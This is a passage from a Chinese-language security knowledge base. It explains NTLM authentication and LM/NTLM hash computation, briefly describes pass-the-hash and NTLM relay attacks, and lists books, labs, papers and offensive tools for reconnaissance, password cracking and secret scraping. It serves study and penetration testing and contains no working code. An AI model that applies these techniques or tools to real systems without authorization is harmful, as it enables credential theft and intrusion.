<li><a class="reference external" href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE-wp.pdf">Delegate to the Top: Abusing Kerberos for arbitrary impersonations and RCE</a></li>
<li><a class="reference external" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94?redirectedfrom=MSDN">Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol</a></li>
</ul>
</div>
</div>
<span id="document-auth/ntlm"></span><div class="section" id="ntlm">
<h3>NTLM 身份验证<a class="headerlink" href="#ntlm" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>NTLM认证<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。</p>
<div class="section" id="id2">
<h5>基本流程<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>客户端在本地加密当前用户的密码成为密码散列</li>
<li>客户端向服务器明文发送账号</li>
<li>服务器端产生一个16位的随机数字发送给客户端，作为一个challenge</li>
<li>客户端用加密后的密码散列来加密challenge，然后返回给服务器，作为response</li>
<li>服务器端将用户名、challenge、response发送给域控制器</li>
<li>域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密chellenge</li>
<li>域控制器比较两次加密的challenge，如果一样那么认证成功，反之认证失败</li>
</ul>
</div>
<div class="section" id="net-ntlmv1">
<h5>Net-NTLMv1<a class="headerlink" href="#net-ntlmv1" title="永久链接至标题">¶</a></h5>
<p>Net-NTLMv1协议的基本流程如下：</p>
<ul class="simple">
<li>客户端向服务器发送一个请求</li>
<li>服务器接收到请求后，生成一个8位的Challenge，发送回客户端</li>
<li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li>
<li>服务器校验response</li>
</ul>
<p>Net-NTLMv1 response的计算方法为</p>
<ul class="simple">
<li>将用户的NTLM hash补零至21字节分成三组7字节数据</li>
<li>三组数据作为3DES加密算法的三组密钥，加密Server发来的Challenge</li>
</ul>
<p>这种方式相对脆弱，可以基于抓包工具和彩虹表爆破工具进行破解。</p>
</div>
<div class="section" id="net-ntlmv2">
<h5>Net-NTLMv2<a class="headerlink" href="#net-ntlmv2" title="永久链接至标题">¶</a></h5>
<p>自Windows Vista起，微软默认使用Net-NTLMv2协议，其基本流程如下：</p>
<ul class="simple">
<li>客户端向服务器发送一个请求</li>
<li>服务器接收到请求后，生成一个16位的Challenge，发送回客户端</li>
<li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li>
<li>服务器校验response</li>
</ul>
</div>
</div>
<div class="section" id="hash">
<h4>Hash<a class="headerlink" href="#hash" title="永久链接至标题">¶</a></h4>
<div class="section" id="lm-hash">
<h5>LM Hash<a class="headerlink" href="#lm-hash" title="永久链接至标题">¶</a></h5>
<p>LM Hash(LAN Manager Hash) 是windows最早用的加密算法，由IBM设计。LM Hash 使用硬编码秘钥的DES，且存在缺陷。早期的Windows系统如XP、Server 2003等使用LM Hash，而后的系统默认禁用了LM Hash并使用NTLM Hash。</p>
<p>LM Hash的计算方式为：</p>
<ul class="simple">
<li>转换用户的密码为大写，14字节截断</li>
<li>不足14字节则需要在其后添加0×00补足</li>
<li>将14字节分为两段7字节的密码</li>
<li>以 <code class="docutils literal notranslate"><span class="pre">KGS!&#64;#$%</span></code> 作为秘钥对这两组数据进行DES加密，得到16字节的哈希</li>
<li>拼接后得到最后的LM Hash。</li>
</ul>
<p>作为早期的算法，LM Hash存在着诸多问题：</p>
<ul class="simple">
<li>密码长度不会超过14字符，且不区分大小写</li>
<li>如果密码长度小于7位，后一组哈希的值确定，可以通过结尾为 <code class="docutils literal notranslate"><span class="pre">aad3b435b51404ee</span></code> 来判断密码长度不超过7位</li>
<li>分组加密极大程度降低了密码的复杂度</li>
<li>DES算法强度低</li>
</ul>
</div>
<div class="section" id="ntlm-hash">
<h5>NTLM Hash<a class="headerlink" href="#ntlm-hash" title="永久链接至标题">¶</a></h5>
<p>为了解决LM Hash的安全问题，微软于1993年在Windows NT 3.1中引入了NTLM协议。</p>
<p>Windows 2000 / XP / 2003 在密码超过14位前使用LM Hash，在密码超过14位后使用NTLM Hash。而之后从Vista开始的版本都使用NTLM Hash。</p>
<p>NTLM Hash的计算方法为：</p>
<ul class="simple">
<li>将密码转换为16进制，进行Unicode编码</li>
<li>基于MD4计算哈希值</li>
</ul>
</div>
</div>
<div class="section" id="id3">
<h4>攻击<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="pass-the-hash">
<h5>Pass The Hash<a class="headerlink" href="#pass-the-hash" title="永久链接至标题">¶</a></h5>
<p>Pass The Hash (PtH) 是攻击者捕获帐号登录凭证后，复用凭证Hash进行攻击的方式。</p>
<p>微软在2012年12月发布了针对Pass The Hash攻击的防御指导，文章中提到了一些防御方法，并说明了为什么不针对Pass The Hash提供更新补丁。</p>
</div>
<div class="section" id="pass-the-key">
<h5>Pass The Key<a class="headerlink" href="#pass-the-key" title="永久链接至标题">¶</a></h5>
<p>在禁用NTLM的环境下，可以用mimikatz等工具直接获取密码。</p>
</div>
<div class="section" id="ntlm-relay">
<h5>NTLM Relay<a class="headerlink" href="#ntlm-relay" title="永久链接至标题">¶</a></h5>
<p>攻击者可以一定程度控制客户端网络的时候，可以使用中间人攻击的方式来获取权限。对客户端伪装为身份验证服务器，对服务端伪装为需要认证的客户端。</p>
</div>
</div>
<div class="section" id="id4">
<h4>参考链接<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.freebuf.com/articles/system/224171.html">Windows身份认证及利用思路</a></li>
<li><a class="reference external" href="http://davenport.sourceforge.net/ntlm.html">The NTLM Authentication Protocol and Security Support Provider</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-tools/index"></span><div class="section" id="id1">
<h2>工具与资源<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-tools/resource"></span><div class="section" id="id1">
<h3>推荐资源<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>书单<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>前端<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Web之困</li>
<li>白帽子讲Web安全</li>
<li>白帽子讲浏览器安全（钱文祥）</li>
<li>Web前端黑客技术揭秘</li>
<li>XSS跨站脚本攻击剖析与防御</li>
<li>SQL注入攻击与防御</li>
</ul>
</div>
<div class="section" id="id4">
<h5>网络<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Understanding linux network internals</li>
<li>TCP/IP Architecture, Design, and Implementation in Linux</li>
<li>Linux Kernel Networking: Implementation and Theory</li>
<li>Bulletproof SSL and TLS</li>
<li>UNIX Network Programming</li>
<li>TCP / IP 协议详解</li>
</ul>
</div>
<div class="section" id="seo">
<h5>SEO<a class="headerlink" href="#seo" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>SEO艺术</li>
</ul>
</div>
<div class="section" id="id5">
<h5>无线攻防<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>无线网络安全攻防实战</li>
<li>无线网络安全攻防实战进阶</li>
<li>黑客大揭秘——近源渗透测试（柴坤哲等）</li>
</ul>
</div>
<div class="section" id="hacking-programming">
<h5>Hacking Programming<a class="headerlink" href="#hacking-programming" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Gray Hat Python</li>
</ul>
</div>
<div class="section" id="id6">
<h5>社会工程学<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>社会工程：安全体系中的人性漏洞</li>
<li>反欺骗的艺术</li>
<li>反入侵的艺术</li>
</ul>
</div>
<div class="section" id="id7">
<h5>数据安全<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>大数据治理与安全 从理论到开源实践（刘驰等）</li>
<li>企业大数据处理 Spark、Druid、Flume与Kafka应用实践（肖冠宇）</li>
<li>数据安全 架构设计与实战（郑云文）</li>
</ul>
</div>
<div class="section" id="id8">
<h5>机器学习与网络安全<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Web安全深度学习实战（刘焱）</li>
<li>Web安全机器学习入门（刘焱）</li>
<li>Web安全之强化学习与GAN（刘焱）</li>
<li>AI安全之对抗样本入门​（兜哥）</li>
</ul>
</div>
<div class="section" id="id9">
<h5>安全建设<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>企业安全建设入门——基于开源软件打造企业网络安全 （刘焱）</li>
<li>企业安全建设指南——金融行业安全架构与技术实践 （聂君等）</li>
<li>大型互联网企业安全架构（石祖文）</li>
<li>CISSP官方学习指南</li>
<li>CISSP认证考试指南</li>
<li>Linux系统安全 纵深防御、安全扫描与入侵检测（胥峰）</li>
</ul>
</div>
<div class="section" id="id10">
<h5>综合<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Web安全深度剖析</li>
<li>黑客秘笈——渗透测试实用指南</li>
<li>黑客攻防技术宝典——web实战篇</li>
</ul>
</div>
</div>
<div class="section" id="website">
<h4>WebSite<a class="headerlink" href="#website" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://adsecurity.org/">https://adsecurity.org/</a></li>
</ul>
</div>
<div class="section" id="blog">
<h4>Blog<a class="headerlink" href="#blog" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.leavesongs.com/">https://www.leavesongs.com/</a></li>
<li><a class="reference external" href="https://paper.seebug.org/">https://paper.seebug.org/</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></li>
<li><a class="reference external" href="https://portswigger.net/blog">https://portswigger.net/blog</a></li>
<li><a class="reference external" href="https://www.hackerone.com/blog">https://www.hackerone.com/blog</a></li>
</ul>
</div>
<div class="section" id="bug-bounty">
<h4>Bug Bounty<a class="headerlink" href="#bug-bounty" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.hackerone.com/">https://www.hackerone.com/</a></li>
<li><a class="reference external" href="https://bugcrowd.com">https://bugcrowd.com</a></li>
<li><a class="reference external" href="https://www.synack.com/">https://www.synack.com/</a></li>
<li><a class="reference external" href="https://cobalt.io/">https://cobalt.io/</a></li>
</ul>
</div>
<div class="section" id="id11">
<h4>实验环境<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<div class="section" id="webctf">
<h5>Web安全相关CTF题目<a class="headerlink" href="#webctf" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/orangetw/My-CTF-Web-Challenges">https://github.com/orangetw/My-CTF-Web-Challenges</a></li>
<li><a class="reference external" href="https://www.ripstech.com/php-security-calendar-2017/">https://www.ripstech.com/php-security-calendar-2017/</a></li>
<li><a class="reference external" href="https://github.com/wonderkun/CTF_web">https://github.com/wonderkun/CTF_web</a></li>
<li><a class="reference external" href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></li>
<li><a class="reference external" href="https://github.com/l4wio/CTF-challenges-by-me">https://github.com/l4wio/CTF-challenges-by-me</a></li>
<li><a class="reference external" href="https://github.com/tsug0d/MyAwesomeWebChallenge">https://github.com/tsug0d/MyAwesomeWebChallenge</a></li>
<li><a class="reference external" href="https://github.com/a0xnirudh/kurukshetra">https://github.com/a0xnirudh/kurukshetra</a></li>
<li><a class="reference external" href="http://www.xssed.com/">http://www.xssed.com/</a></li>
</ul>
</div>
<div class="section" id="id12">
<h5>域实验环境<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/christophetd/Adaz">Adaz</a>: Active Directory Hunting Lab in Azure</li>
<li><a class="reference external" href="https://github.com/clong/DetectionLab">Detection</a> Vagrant &amp; Packer scripts to build a lab environment complete with security tooling and logging best practices</li>
</ul>
</div>
</div>
<div class="section" id="id13">
<h4>知识库<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<div class="section" id="awesome">
<h5>Awesome 系列<a class="headerlink" href="#awesome" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/zer0yu/Awesome-CobaltStrike">Awesome CobaltStrike</a></li>
<li><a class="reference external" href="https://github.com/fabacab/awesome-cybersecurity-blueteam">Awesome Cybersecurity Blue Team</a></li>
<li><a class="reference external" href="https://github.com/Hack-with-Github/Awesome-Hacking">Awesome Hacking</a></li>
<li><a class="reference external" href="https://github.com/PaulSec/awesome-sec-talks">awesome sec talks</a></li>
<li><a class="reference external" href="https://github.com/sbilly/awesome-security">Awesome Security</a></li>
<li><a class="reference external" href="https://github.com/qazbnm456/awesome-web-security">awesome web security</a></li>
<li><a class="reference external" href="https://github.com/saeidshirazi/awesome-android-security">Awesome-Android-Security</a></li>
</ul>
</div>
<div class="section" id="bug-hunting">
<h5>Bug Hunting<a class="headerlink" href="#bug-hunting" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/KathanP19/HowToHunt">HowToHunt</a> Tutorials and Things to Do while Hunting Vulnerability</li>
</ul>
</div>
<div class="section" id="java">
<h5>Java<a class="headerlink" href="#java" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/threedr3am/learnjavabug">learnjavabug</a> Java安全相关的漏洞和技术demo</li>
</ul>
</div>
<div class="section" id="id14">
<h5>红蓝对抗<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/redcanaryco/atomic-red-team">atomic red team</a> Small and highly portable detection tests based on MITRE's ATT&amp;CK</li>
</ul>
</div>
<div class="section" id="id15">
<h5>后渗透<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/rootclay/Powershell-Attack-Guide.git">Powershell攻击指南 黑客后渗透之道</a></li>
<li><a class="reference external" href="https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet">Active Directory Exploitation Cheat Sheet</a></li>
</ul>
</div>
</div>
</div>
<span id="document-tools/papers"></span><div class="section" id="id1">
<h3>相关论文<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>论文列表<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/techge/PRE-list">PRE-list</a> List of (automatic) protocol reverse engineering tools for network protocols</li>
</ul>
</div>
<div class="section" id="id3">
<h4>流量分析<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.</li>
<li>Nasr M, Houmansadr A, Mazumdar A. Compressive traffic analysis: A new paradigm for scalable traffic analysis[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2053-2069.</li>
</ul>
</div>
<div class="section" id="id4">
<h4>漏洞自动化<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Staicu C A, Pradel M, Livshits B. SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE. JS[C]//NDSS. 2018.</li>
<li>Atlidakis V , Godefroid P , Polishchuk M . REST-ler: Automatic Intelligent REST API Fuzzing[J]. 2018.</li>
<li>Alhuzali A, Gjomemo R, Eshete B, et al. {NAVEX}: Precise and Scalable Exploit Generation for Dynamic Web Applications[C]//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 377-392.</li>
</ul>
</div>
<div class="section" id="id5">
<h4>攻击技巧<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Lekies S, Kotowicz K, Groß S, et al. Code-reuse attacks for the web: Breaking cross-site scripting mitigations via script gadgets[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1709-1723.</li>
<li>Papadopoulos P, Ilia P, Polychronakis M, et al. Master of Web Puppets: Abusing Web Browsers for Persistent and Stealthy Computation[J]. arXiv preprint arXiv:1810.00464, 2018.</li>
</ul>
</div>
<div class="section" id="id6">
<h4>攻击检测<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Liu T, Qi Y, Shi L, et al. Locate-then-detect: real-time web attack detection via attention-based deep neural networks[C]//Proceedings of the 28th International Joint Conference on Artificial Intelligence. AAAI Press, 2019: 4725-4731.</li>
</ul>
</div>
<div class="section" id="id7">
<h4>隐私<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Klein A, Pinkas B. DNS Cache-Based User Tracking[C]//NDSS. 2019.</li>
</ul>
</div>
<div class="section" id="id8">
<h4>指纹<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Hayes J, Danezis G. k-fingerprinting: A robust scalable website fingerprinting technique[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 1187-1203.</li>
<li>Overdorf R, Juarez M, Acar G, et al. How unique is your. onion?: An analysis of the fingerprintability of tor onion services[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2021-2036.</li>
</ul>
</div>
<div class="section" id="id9">
<h4>侧信道<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Rosner N, Kadron I B, Bang L, et al. Profit: Detecting and Quantifying Side Channels in Networked Applications[C]//NDSS. 2019.</li>
</ul>
</div>
<div class="section" id="id10">
<h4>认证<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Ghasemisharif M, Ramesh A, Checkoway S, et al. O single sign-off, where art thou? an empirical analysis of single sign-on account hijacking and session management on the web[C]//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 1475-1492.</li>
</ul>
</div>
<div class="section" id="id11">
<h4>防护<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Pellegrino G, Johns M, Koch S, et al. Deemon: Detecting CSRF with dynamic analysis and property graphs[C]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1757-1771.</li>
</ul>
</div>
</div>
<span id="document-tools/info"></span><div class="section" id="id1">
<h3>信息收集<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="whois">
<h4>Whois<a class="headerlink" href="#whois" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://who.is/">who.is</a></li>
<li><a class="reference external" href="https://whois.aliyun.com/">万网WHOIS</a></li>
<li><a class="reference external" href="https://whois.cloud.tencent.com/">腾讯云WHOIS</a></li>
<li><a class="reference external" href="https://whois.chinaz.com/">站长之家WHOIS</a></li>
</ul>
</div>
<div class="section" id="id5">
<h4>网站备案<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.tianyancha.com/">天眼查</a></li>
<li><a class="reference external" href="http://www.beianbeian.com/">ICP备案查询</a></li>
<li><a class="reference external" href="https://icp.aizhan.com">爱站备案查询</a></li>
</ul>
</div>
<div class="section" id="cdn">
<h4>CDN查询<a class="headerlink" href="#cdn" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://ping.chinaz.com/">多地Ping</a></li>
<li><a class="reference external" href="https://tools.ipip.net/cdn.php">CDN服务商查询</a></li>
</ul>
</div>
<div class="section" id="id9">
<h4>子域爆破<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a></li>
<li><a class="reference external" href="https://github.com/ring04h/wydomain">wydomain</a></li>
<li><a class="reference external" href="https://github.com/code-scan/BroDomain">broDomain</a></li>
<li><a class="reference external" href="https://github.com/FeeiCN/ESD">ESD</a></li>
<li><a class="reference external" href="https://github.com/blark/aiodnsbrute">aiodnsbrute</a></li>
<li><a class="reference external" href="https://github.com/shmilylty/OneForAll">OneForAll</a></li>
<li><a class="reference external" href="https://github.com/subfinder/subfinder">subfinder</a></li>
</ul>
</div>
<div class="section" id="id10">
<h4>域名获取<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/appsecco/the-art-of-subdomain-enumeration">the art of subdomain enumeration</a></li>
<li><a class="reference external" href="https://github.com/cheetz/sslScrape/blob/master/sslScrape.py">sslScrape</a></li>
<li><a class="reference external" href="https://github.com/michenriksen/aquatone">aquatone</a> A Tool for Domain Flyovers</li>
<li><a class="reference external" href="https://github.com/bit4woo/teemo">teemo</a> A Domain Name &amp; Email Address Collection Tool</li>
<li><a class="reference external" href="https://dnsdb.io/zh-cn/">DNS DB 历史记录</a></li>
</ul>
</div>
<div class="section" id="id11">
<h4>弱密码爆破<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/vanhauser-thc/thc-hydra">hydra</a></li>
<li><a class="reference external" href="https://github.com/jmk-foofus/medusa">medusa</a> is a high-speed network authentication cracking tool</li>
<li><a class="reference external" href="https://github.com/nmap/ncrack">Ncrack</a></li>
<li><a class="reference external" href="https://github.com/lijiejie/htpwdScan">htpwdScan</a></li>
<li><a class="reference external" href="https://github.com/lanjelot/patator">patator</a></li>
</ul>
</div>
<div class="section" id="git">
<h4>Git信息泄漏<a class="headerlink" href="#git" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/lijiejie/GitHack">GitHack By lijiejie</a></li>
<li><a class="reference external" href="https://github.com/BugScanTeam/GitHack">GitHack By BugScan</a></li>
<li><a class="reference external" href="https://github.com/internetwache/GitTools">GitTools</a></li>
<li><a class="reference external" href="https://github.com/s0md3v/Zen">Zen</a></li>
<li><a class="reference external" href="https://github.com/dxa4481/truffleHog">dig github history</a></li>
<li><a class="reference external" href="https://github.com/michenriksen/gitrob">gitrob Reconnaissance tool for GitHub organizations</a></li>
<li><a class="reference external" href="https://github.com/awslabs/git-secrets">git secrets</a></li>
<li><a class="reference external" href="https://github.com/eth0izzle/shhgit">shhgit</a> Find GitHub secrets in real time</li>
<li><a class="reference external" href="https://github.com/tillson/git-hound">GitHound</a> GitHound pinpoints exposed API keys on GitHub using pattern matching, commit history searching, and a unique result scoring system. A batch-catching, pattern-matching, patch-attacking secret snatcher</li>
<li><a class="reference external" href="https://github.com/MiSecurity/x-patrol">x patrol</a> Github leaked patrol</li>
<li><a class="reference external" href="https://github.com/obheda12/GitDorker">GitDorker</a> scrape secrets from GitHub through usage of a large repository of dorks</li>
</ul>
</div>
<div class="section" id="github">
<h4>Github监控<a class="headerlink" href="#github" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/VKSRC/Github-Monitor">Github Monitor</a> Github Sensitive Information Leakage Monitor</li>
<li><a class="reference external" href="https://github.com/techgaun/github-dorks">Github Dorks</a></li>
<li><a class="reference external" href="https://github.com/FeeiCN/GSIL">GSIL</a></li>
<li><a class="reference external" href="https://github.com/0xbug/Hawkeye">Hawkeye</a></li>
<li><a class="reference external" href="https://github.com/neal1991/gshark">gshark</a></li>
<li><a class="reference external" href="https://github.com/BishopFox/GitGot">GitGot</a></li>
<li><a class="reference external" href="https://github.com/hisxo/gitGraber">gitGraber</a> monitor GitHub to search and find sensitive data in real time for different online services</li>
</ul>
</div>
<div class="section" id="id12">
<h4>路径及文件扫描<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ring04h/weakfilescan">weakfilescan</a></li>
<li><a class="reference external" href="https://github.com/Xyntax/DirBrute">DirBrute</a></li>
<li><a class="reference external" href="https://github.com/maurosoria/dirsearch">dirsearch</a></li>
<li><a class="reference external" href="https://github.com/mazen160/bfac">bfac</a></li>
<li><a class="reference external" href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a></li>
</ul>
</div>
<div class="section" id="id13">
<h4>路径爬虫<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/0Kee-Team/crawlergo">crawlergo</a> A powerful dynamic crawler for web vulnerability scanners</li>
</ul>
</div>
<div class="section" id="id14">
<h4>指纹识别<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/AliasIO/Wappalyzer">Wappalyzer</a></li>
<li><a class="reference external" href="https://github.com/urbanadventurer/whatweb">whatweb</a></li>
<li><a class="reference external" href="https://github.com/iniqua/plecost">Wordpress Finger Print</a></li>
<li><a class="reference external" href="https://github.com/n4xh4ck5/CMSsc4n">CMS指纹识别</a></li>
<li><a class="reference external" href="https://github.com/salesforce/ja3">JA3</a> is a standard for creating SSL client fingerprints in an easy to produce and shareable way</li>
<li><a class="reference external" href="https://github.com/TideSec/TideFinger">TideFinger</a></li>
<li><a class="reference external" href="https://github.com/salesforce/jarm">JARM</a> active Transport Layer Security (TLS) server fingerprinting tool</li>
</ul>
</div>
<div class="section" id="waf">
<h4>Waf指纹<a class="headerlink" href="#waf" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/enablesecurity/identywaf">identywaf</a></li>
<li><a class="reference external" href="https://github.com/enablesecurity/wafw00f">wafw00f</a></li>
<li><a class="reference external" href="https://github.com/Ekultek/WhatWaf">WhatWaf</a></li>
</ul>
</div>
<div class="section" id="id15">
<h4>端口扫描<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/nmap/nmap">nmap</a></li>
<li><a class="reference external" href="https://github.com/zmap/zmap">zmap</a></li>
<li><a class="reference external" href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a class="reference external" href="https://github.com/HatBashBR/ShodanHat">ShodanHat</a></li>
<li><a class="reference external" href="https://github.com/zmap/zgrab2">ZGrab2</a> Fast Go Application Scanner</li>
<li><a class="reference external" href="https://github.com/RustScan/RustScan">RustScan</a> The Modern Port Scanner</li>
<li>DNS <code class="docutils literal notranslate"><span class="pre">dnsenum</span> <span class="pre">nslookup</span> <span class="pre">dig</span> <span class="pre">fierce</span></code></li>
<li>SNMP <code class="docutils literal notranslate"><span class="pre">snmpwalk</span></code></li>
</ul>
</div>
<div class="section" id="dns">
<h4>DNS数据查询<a class="headerlink" href="#dns" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.virustotal.com/">VirusTotal</a></li>
<li><a class="reference external" href="https://passivetotal.org">PassiveTotal</a></li>
<li><a class="reference external" href="https://www.dnsdb.info/">DNSDB</a></li>
<li><a class="reference external" href="http://www.sitedossier.com/">sitedossier</a></li>
</ul>
</div>
<div class="section" id="id16">
<h4>DNS关联<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/mandatoryprogrammer/cloudflare_enum">Cloudflare Enumeration Tool</a></li>
<li><a class="reference external" href="https://github.com/caffix/amass">amass</a></li>
<li><a class="reference external" href="https://crt.sh/">Certificate Search</a></li>
</ul>
</div>
<div class="section" id="id17">
<h4>云服务<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/gwen001/s3-buckets-finder">Find aws s3 buckets</a></li>
<li><a class="reference external" href="https://github.com/jordanpotti/CloudScraper">CloudScraper</a></li>
<li><a class="reference external" href="https://github.com/jordanpotti/AWSBucketDump">AWS Bucket Dump</a></li>
</ul>
</div>
<div class="section" id="id18">
<h4>数据查询<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://censys.io">Censys</a></li>
<li><a class="reference external" href="https://www.shodan.io/">Shodan</a></li>
<li><a class="reference external" href="https://www.zoomeye.org/">Zoomeye</a></li>
<li><a class="reference external" href="https://fofa.so/">fofa</a></li>
<li><a class="reference external" href="https://scans.io/">scans</a></li>
<li><a class="reference external" href="https://github.com/FortyNorthSecurity/Just-Metadata">Just Metadata</a></li>
<li><a class="reference external" href="https://publicwww.com/">publicwww - Find Web Pages via Snippet</a></li>
</ul>
</div>
<div class="section" id="password">
<h4>Password<a class="headerlink" href="#password" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/berzerk0/Probable-Wordlists">Probable Wordlists</a> Wordlists sorted by probability originally created for password generation and testing</li>
<li><a class="reference external" href="https://github.com/Mebus/cupp">Common User Passwords Profiler</a></li>
<li><a class="reference external" href="https://github.com/x899/chrome_password_grabber">chrome password grabber</a></li>
<li><a class="reference external" href="https://github.com/ihebski/DefaultCreds-cheat-sheet">DefaultCreds cheat sheet</a> One place for all the default credentials to assist the pentesters during an engagement</li>
</ul>
</div>
<div class="section" id="ci">
<h4>CI信息泄露<a class="headerlink" href="#ci" title="永久链接至标题">¶</a></h4>
<ul class="simple">
